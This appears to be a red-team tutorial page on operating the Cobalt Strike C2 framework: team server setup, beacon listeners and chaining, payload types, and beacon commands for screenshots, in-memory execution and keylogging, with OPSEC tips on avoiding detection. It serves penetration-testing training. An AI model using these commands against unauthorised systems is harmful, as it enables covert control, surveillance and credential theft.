title: C2 - Cobalt Strike
category: Red Team
order: 3
---

**Cobalt Strike** was one of the first public red team command and control frameworks.

Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs.

Cobalt Strike is split into client and a server components. 

Check more info in the official documentation.

# Installation

```
sudo apt-add-repository 'deb http://security.debian.org/debian-security stretch/updates main'
sudo apt-get update
sudo apt-get install openjdk-11-jdk
sudo apt install proxychains socat
sudo update-alternatives --config java #Select openjdk-11
```

# Starting the Team Server

The server, referred to as the team server, is the controller for the Beacon payload and the host for Cobalt Strikeâ€™s social engineering features. The team server also stores data collected by Cobalt Strike and it manages logging.

The server run on a **supported Linux** systems. To start the team server, execute the following command:

```
./teamserver <IP> <Password> <Malleable C2 Profile>

[*] Generating X509 certificate and keystore (for SSL)
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: eadd46ff4f74d582290ce1755513ddfc0ffd736f90bed5d8d662ee113faccb43
```
Once started we can launch the client and connect with the password used.

Verify the server's fingerprint before connecting.

> **OPSEC Note:** The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn't expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN.


# Listeners

A listener is a host/port/protocol combination that listens for inconming communication from a beacon.

There are two types:

* **Egress**: This listener acts like a web server, where the Team Server and the Beacon will encapsulate their communication over HTTP protocol. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.

* **Peer-to-peer**: Allow beaacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.

In order to create a listener go to `Cobalt Strike -> Listeners` and click the button `Add`.

## Peer-to-Peer (P2P) listeners

Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are TCP and SMB.

Link beacon is specially useful when it comes to pivoting, and other situation where you need to spawn an additional beacon payload.

> **Note**: Help to keep the number of direct outbound connections.

We can create a P2P listener by selecting `Beacon SMB` or `Beacon TCP` payload.

If executing a P2P payload on a target manually, it won't appear in the UI until the `link` (for SMB Beacons) or `connect` (for TCP Beacons) command is used. You can also `unlink` P2P Beacons and then use `link` again from another Beacon to reorganise the chain.

Commands such as `spawn`, `spanwas`, `inject` and `jump` can be use with these payloads.

There are **no limit** of chain connections but if any of the middle beacons gets disconnected, all the child beacons would be disconnected, but we can `link` or `connect` another time.

### Beacon TCP

While creating the beacon we need to select the port where the target machine will listen and if we want that the target bind to localhost or in all interfaces.

![](/hackingnotes/images/cobaltstrike-listener-tcp-chain.png)

Once executed the payload for a `Beacon TCP` a listener will be launched waiting to a connection. In order to spawn the beacon we need to connect to it with the command `connect`.

Usage of command `connect`:
```
beacon> help connect
Use: connect [target]
     connect [target] [port]

Connect to a TCP Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon.

Use 'unlink' to disconnect from a TCP Beacon.
```
So we just need to select the host and the port.

```
beacon> connect 10.10.10.10 4444
```
After that a chain on beacons will be created.

> **Note**: `Beacon TCP` binding in localhost are recommended to privilege escalations.

### Beacon SMB

While creating the beacon we only need to select the pipename that will be used.

![](/hackingnotes/images/cobaltstrike-listener-p2p.png)

Same as TCP the beacon will listen to a connection. In that case we need to link pipenames with `link` command.

We can list them with:

```
ls \\.\pipe\
```

Usage of `link` command:

```
beacon> help link
Use: link [target] [pipe]
     link [target]

Connect to an SMB Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon. Specify an explicit [pipe]
to link to that pipename. The default pipe from the current profile is
used otherwise.
```

So we just have to select the target and the chosen pipename in the listener creation.

```
beacon> link 10.10.10.10 \\10.10.10.10\pipe\interprocess_28
```
We can also use `link` command again to reorganize the chain after getting disconnected.

# Payloads

There are two types of payloads:

* **Staged**: Staged payloads are tiny, when executed the real shellcode is transfered and execute. 

* **Stageless**: It contains the whole shellcole which means is bigger than staged payloads.

> **OPSEC Note**: Staged payloads are useful when the delivery method is limited to an amount of data that we can send. However, they tend to have more indicators and is more detectable than stageless payloads.

Cobalt Strike can generate both staged and stageless payloads. On GUI if we see a `(S)` means that is *stageless*.

## Staged Payloads

Go to `Attacks -> Packages -> Windows Executable`:

## Stageless Payloads

Go to `Attacks -> Packages -> Windows Executable (S)`:

> **OPSEC Note**: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.

```

## Help <command>

We can also get help of a command with `help <command>`:

```
beacon> help sleep
Use: sleep [time in seconds] <jitter>

Change how often the beacon calls home. Use sleep 0 to force Beacon to call 
home many times each second. 

Specify a jitter value (0-99) to force Beacon to randomly modify its sleep time.
```

> **Note**: Parameters wrapped in `[ ]` are mandatory, whilst those in `< >` are optional although the default value maybe in not the best option.



## Sleep

With `sleep` command we can modify the time when the beacon checks into the team server, by default is setted to 60 seconds.

```
beacon> sleep 5
[*] Tasked beacon to sleep for 5s
[+] host called home, sent: 16 bytes
```

> **OPSEC Note**: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage.

## Execute Assembly

The `execute-assembly` command allows the beacon to run `.NET` executables directly from memory.

```
beacon> execute-assembly C:\Tools\Tool.exe
```

# Hosting Files

Cobalt Strike allows us to host files in his web server. Go to `Attacks -> Web Drive-by -> Host File`.


![](/hackingnotes/images/cobaltstrike-hostfile.png)


# Screenshots

We can retrieve important information doing screenshots of the user's desktop. We can retrieve shortcuts they have, what documents they're looking and so on.

Screenshots are stored in `View -> Screenshots`.

Beacon has multiple commands to take screenshots.

* **printscreen**: Take a single screenshot via PrintScr method.
```
beacon> printscreen
```

* **screenhost**: Take a single screenshot.
```
beacon> screenhost
```

* **screenwatch**: Take periodic screenshots.
```
beacon> screenwatch
```

# Keylogger

A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data.

We can see the output of the keylogger in `View -> Keystrokes`.

```
beacon> keylogger
```

The keylogger runs as a job that can be stopped with the jobkill command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1
```
